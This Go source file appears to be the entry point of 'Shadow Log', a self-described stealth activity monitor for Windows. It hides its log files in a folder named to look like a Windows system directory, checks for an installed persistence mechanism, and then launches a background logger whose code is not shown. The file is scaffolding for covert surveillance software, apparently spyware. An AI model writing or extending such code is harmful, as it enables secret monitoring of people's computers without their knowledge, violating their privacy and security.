package main

import (
	"fmt"
	"os"
	"shadowlog/config"
	"shadowlog/monitor"
	"shadowlog/persistence"
	"shadowlog/ui"
	"syscall"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex = kernel32.NewProc("CreateMutexW")
)

func main() {
	// Shadow Log: Advanced Stealth Activity Monitor.
	
	// 0. Panic Recovery (Debug Logging)
	// Catch any unexpected crashes and log them to a file for diagnosis.
	defer func() {
		if r := recover(); r != nil {
			localApp := os.Getenv("LOCALAPPDATA")
			dir := localApp + "\\Microsoft\\Windows\\SystemCache"
			os.MkdirAll(dir, 0755)
			path := dir + "\\win_recovery_log.txt"
			os.WriteFile(path, []byte(fmt.Sprintf("RECOVERY at startup: %v", r)), 0644)
		}
	}()

	// 1. Single Instance Check (Named Mutex)
	// We avoid "Global\" prefix to ensure it works for standard users without admin.
	mutexName, _ := syscall.UTF16PtrFromString("Shadow_Log_Sync")
	// procCreateMutex.Call returns (handle, 0, lastErr)
	h, _, lastErr := procCreateMutex.Call(0, 1, uintptr(unsafe.Pointer(mutexName)))
	
	// ERROR_ALREADY_EXISTS (183) means another instance has already created this mutex.
	if h == 0 || lastErr == syscall.Errno(183) {
		os.Exit(0)
	}

	// 2. Initial Load Config
	// Load existing configuration from the unified binary storage file.
	cfg, err := config.LoadConfig()
	if err != nil || cfg == nil {
		// Recovery: Create default config if missing or corrupted (JSON "null").
		cfg = &config.Config{
			LogLocal: true,
			Interval: 60,
		}
		config.SaveConfig(cfg)
	}

	// 3. Runtime Status for UI
	cfg.IsInstalled = persistence.IsInstalled()

	// 4. Run Mode Selection
	if !cfg.IsInstalled {
		// UI Mode: First run - show setup wizard.
		ui.ShowSetup(cfg, startLogger)
		
		// Immediately after setup wizard closes, re-verify installation status.
		cfg.IsInstalled = persistence.IsInstalled()
		if !cfg.IsInstalled {
			// Setup was closed without completion. Exit.
			os.Exit(0)
		}

		// Re-load config after setup to get the new fields.
		if newCfg, err := config.LoadConfig(); err == nil {
			newCfg.IsInstalled = true
			cfg = newCfg
		}
	}
	
	// Start the logger in the background ONLY if properly installed.
	if cfg != nil && cfg.IsInstalled {
		startLogger(cfg, nil)()
	}
}

func startLogger(cfg *config.Config, cb func(string)) func() {
	return func() {
		logger := monitor.NewLogger(cfg, cb)
		logger.Start()
	}
}
